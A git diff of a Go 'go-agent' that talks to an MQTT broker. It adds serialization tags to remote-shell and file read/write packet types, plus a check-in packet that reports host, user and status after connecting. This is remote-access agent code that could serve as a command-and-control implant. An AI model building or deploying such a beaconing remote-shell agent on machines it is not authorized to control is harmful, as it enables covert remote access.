@@ -5,66 +5,73 @@ import (
 	"go-agent/inators/remoteshell"
 
 	"fmt"
-	
+
 	"github.com/eclipse/paho.mqtt.golang"
 	"github.com/vmihailenco/msgpack"
 )
 
+type IdentificationPacket struct {
+	Id			string	`msgpack:"id"`
+	Host		string	`msgpack:"host"`
+	User		string	`msgpack:"user"`
+	Status	string	`msgpack:"status"`
+}
+
 type RemoteShellOpenPacket struct {
-	Shell	string
+	Shell		string	`msgpack:"shell"`
 }
 
 type RemoteShellClosePacket struct {
-	Pid	int
+	Pid			int			`msgpack:"pid"`
 }
 
 type RemoteShellWritePacket struct {
-	Pid	int
-	Data	string
+	Pid			int			`msgpack:"pid"`
+	Data		string	`msgpack:"data"`
 }
 
 type RemoteShellOnOpenPacket struct {
-	Pid 	int
-	Shell	string
+	Pid 		int			`msgpack:"pid"`
+	Shell		string	`msgpack:"shell"`
 }
 
 type RemoteShellOnClosePacket struct {
-	Pid 	int
+	Pid 		int			`msgpack:"pid"`
 }
 
 type RemoteShellOnReadPacket struct {
-	Pid 	int
-	Data	string
+	Pid			int			`msgpack:"pid"`
+	Data		string	`msgpack:"data"`
 }
 
 type RemoteShellOnWritePacket struct {
-	Pid 	int
-	Data	string
+	Pid			int			`msgpack:"pid"`
+	Data		string	`msgpack:"data"`
 }
 
 type RemoteShellOnErrorPacket struct {
-	Pid 	int
-	Error	string
+	Pid			int			`msgpack:"pid"`
+	Error		string	`msgpack:"error"`
 }
 
 type FileReadWriteOnReadPacket struct {
-	File 	string
-	Length 	int
-	Offset 	int
-	Data 	[]byte
+	File 		string	`msgpack:"file"`
+	Length 	int			`msgpack:"length"`
+	Offset 	int			`msgpack:"offset"`
+	Data 		[]byte	`msgpack:"data"`
 }
 
 type FileReadWriteOnWritePacket struct {
-	File 	string
+	File 		string	`msgpack:"file"`
 	//Data 	[]byte
-	Offset 	int
-	Length 	int
+	Offset 	int			`msgpack:"offset"`
+	Length 	int			`msgpack:"length"`
 }
 
 type FileReadWriteOnErrorPacket struct {
-	File 	string
-	Mode	string
-	Error	string
+	File 		string	`msgpack:"file"`
+	Mode		string	`msgpack:"mode"`
+	Error		string	`msgpack:"error"`
 }
 
 func main() {
@@ -157,16 +164,24 @@ func main() {
 
 	if token := c.Connect(); token.Wait() && token.Error() != nil {
 		panic(token.Error())
+	} else {
+		payload, _ := msgpack.Marshal(&IdentificationPacket {
+			Id: "123D",
+			Host: "go-agent",
+			User: "reedleoneil",
+			Status:	"online",
+		})
+		c.Publish("/bu/shinobi/" + "123D", 0, false, payload)
 	}
 
 	if token := c.Subscribe("/rs/open", 0, rsOpenHandler); token.Wait() && token.Error() != nil {
 		fmt.Println(token.Error())
-	} 
+	}
 
 	if token := c.Subscribe("/rs/close", 0, rsCloseHandler); token.Wait() && token.Error() != nil {
 		fmt.Println(token.Error())
 	}
- 
+
 	if token := c.Subscribe("/rs/write", 0, rslWriteHandler); token.Wait() && token.Error() != nil {
 		fmt.Println(token.Error())
 	}
